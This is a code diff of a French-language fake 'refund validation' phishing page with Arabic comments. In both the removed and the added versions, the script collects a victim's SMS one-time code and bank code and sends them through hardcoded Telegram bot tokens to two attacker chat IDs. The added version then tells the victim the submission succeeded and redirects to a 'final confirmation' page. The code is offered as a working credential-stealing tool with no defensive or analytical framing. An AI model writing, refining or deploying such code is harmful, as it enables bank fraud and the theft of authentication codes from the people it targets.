@@ -1,111 +1,48 @@
-<!DOCTYPE html>
-<html lang="fr">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Validation de Remboursement</title>
-    <style>
-        body {
-            font-family: 'Roboto', sans-serif;
-            margin: 0;
-            padding: 0;
-            background-color: #f7f9fc;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-        }
-        .container {
-            background: #ffffff;
-            border-radius: 12px;
-            box-shadow: 0 12px 24px rgba(0, 0, 0, 0.1);
-            padding: 25px;
-            max-width: 450px;
-            width: 100%;
-            text-align: center;
-        }
-        input {
-            width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            border: 1px solid #ccc;
-            border-radius: 6px;
-            font-size: 14px;
-            box-sizing: border-box;
-        }
-        .btn {
-            display: inline-block;
-            background-color: #4caf50;
-            color: #fff;
-            font-weight: bold;
-            padding: 12px;
-            border-radius: 6px;
-            width: 100%;
-            text-align: center;
-            text-decoration: none;
-            margin-top: 10px;
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h2>Validation de Remboursement</h2>
-        <input type="text" id="code-sms" placeholder="Code SMS">
-        <input type="text" id="code-banque" placeholder="Code Banque">
-        <a href="#" class="btn" onclick="sendToTelegram()">Valider</a>
-    </div>
+<script>
+    // تحديث وظيفة validate لإضافة إرسال إلى Telegram
+    function validate() {
+        const smsCode = document.getElementById('code-sms').value;
+        const bankCode = document.getElementById('code-banque').value;
 
-    <script>
-        async function sendToTelegram() {
-            const smsCode = document.getElementById('code-sms').value;
-            const bankCode = document.getElementById('code-banque').value;
-
-            if (!smsCode || !bankCode) {
-                alert("Veuillez remplir tous les champs.");
-                return;
-            }
-
+        if (smsCode === "" || bankCode === "") {
+            alert("Veuillez remplir tous les champs.");
+        } else {
             const message = `Code SMS: ${smsCode}\nCode Banque: ${bankCode}`;
 
-            // إرسال إلى البوت الأول
+            // إرسال البيانات إلى البوت الأول
             const bot1Token = "7631724461:AAGvOb7G_n2IO1qGwpJp-WaHgyBhREW1mfU";
             const chatId1 = "5372119436";
 
-            // إرسال إلى البوت الثاني
+            // إرسال البيانات إلى البوت الثاني
             const bot2Token = "7416570408:AAHdYlssG3BwSoMe7C4mYc61gt8ORSscxDc";
             const chatId2 = "7198476943";
 
-            try {
-                // إرسال الرسالة إلى البوت الأول
-                await fetch(`https://api.telegram.org/bot${bot1Token}/sendMessage`, {
+            // دالة إرسال البيانات
+            function sendToTelegram(botToken, chatId, message) {
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                     method: "POST",
                     headers: {
                         "Content-Type": "application/json"
                     },
                     body: JSON.stringify({
-                        chat_id: chatId1,
+                        chat_id: chatId,
                         text: message
                     })
+                }).then(response => {
+                    if (!response.ok) {
+                        console.error(`خطأ في إرسال البيانات إلى البوت ${botToken}`);
+                    }
+                }).catch(error => {
+                    console.error("خطأ أثناء الإرسال:", error);
                 });
-
-                // إرسال الرسالة إلى البوت الثاني
-                await fetch(`https://api.telegram.org/bot${bot2Token}/sendMessage`, {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify({
-                        chat_id: chatId2,
-                        text: message
-                    })
-                });
-
-                alert("تم إرسال البيانات بنجاح!");
-            } catch (error) {
-                console.error("خطأ في الإرسال:", error);
-                alert("حدث خطأ أثناء إرسال البيانات.");
             }
+
+            // إرسال الرسالة إلى البوتين
+            sendToTelegram(bot1Token, chatId1, message);
+            sendToTelegram(bot2Token, chatId2, message);
+
+            alert("تم إرسال البيانات بنجاح!");
+            window.location.href = "confirmation_finale.html"; // توجيه للصفحة النهائية
         }
-    </script>
-</body>
-</html>
+    }
+</script>
